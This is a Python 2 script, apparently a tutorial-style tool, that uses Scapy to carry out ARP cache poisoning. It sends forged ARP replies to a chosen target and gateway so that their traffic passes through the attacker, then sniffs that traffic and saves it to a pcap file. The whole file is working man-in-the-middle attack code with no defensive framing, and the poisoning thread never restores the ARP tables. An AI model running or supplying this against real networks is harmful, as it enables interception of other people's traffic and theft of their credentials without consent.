from scapy.all import *
import sys
import getopt
import threading
import os
import signal

opts,args=getopt.getopt(sys.argv[1:],'h',['target=','gateway=','interface','help'])
target_ip='0.0.0.0'
gateway_ip='0.0.0.0'
target_mac='ff:ff:ff:ff:ff:ff'
gateway_mac='ff:ff:ff:ff:ff:ff'
interface='eth0'
for opt,value in opts:
    if(opt=='--target'):
        target_ip=value
    elif(opt=='--gateway'):
        gateway_ip=value
    elif(opt=='--interface'):
        interface=value
#print target_ip,gateway_ip,interface
conf.iface=interface
conf.verb=0
print "start arp poison"

def main():
    global target_ip,gateway_ip,target_mac,gateway_mac
    gateway_mac=getMac(gateway_ip)
    target_mac=getMac(target_ip)
    poison_thread=Poison_Thread()
    poison_thread.start()
    packet_count=10
    fil="ip host %s" % target_ip
    packets=sniff(count=packet_count,filter=fil,iface=interface)
    wrpcap('arper.pcap',packets)
    poison_thread.stop()
    poison_thread.join()


def getMac(ip):
    ans,unans=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),timeout=2,retry=10)
    for s,r in ans:
        return r[Ether].src
'''
def poison(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target=ARP()
    poison_target.op=2
    poison_target.psrc=gateway_ip
    poison_target.pdst=target_ip
    poison_target.hwdst=target_mac

    poison_gateway=ARP()
    poison_gateway.op=2
    poison_gateway.psrc=target_ip
    poison_gateway.pdst=gateway_ip
    poison_gateway.hwdst=gateway_mac

    print "sending packets..."

    while True:
        try:
            send(poison_gateway)
            send(poison_target)
            time.sleep(2)
            print 'send again'

        except KeyboardInterrupt:
            break
    print "stop arp"
    return
'''

class Poison_Thread(threading.Thread):
    global target_ip,target_mac,gateway_ip,gateway_mac
    def __init__(self):
        super(Poison_Thread,self).__init__()
        self.stopped=False
    def run(self):
        def poison(gateway_ip,gateway_mac,target_ip,target_mac):
            poison_target=ARP()
            poison_target.op=2
            poison_target.psrc=gateway_ip
            poison_target.pdst=target_ip
            poison_target.hwdst=target_mac
            poison_gateway=ARP()
            poison_gateway.op=2
            poison_gateway.psrc=target_ip
            poison_gateway.pdst=gateway_ip
            poison_gateway.hwdst=gateway_mac
            print "sending packets..."
            while True:
                try:
                    send(poison_gateway)
                    send(poison_target)
                    time.sleep(2)
                    print 'send again'
                except KeyboardInterrupt:
                    pass
            print "stop arp"
            return
        sub=threading.Thread(target=poison,args=(gateway_ip,gateway_mac,target_ip,target_mac))
        sub.setDaemon(True)
        sub.start()

        while not self.stopped:
            sub.join(1)
    def stop(self):
        self.stopped=True


if __name__=='__main__':
    main()
    print "over"
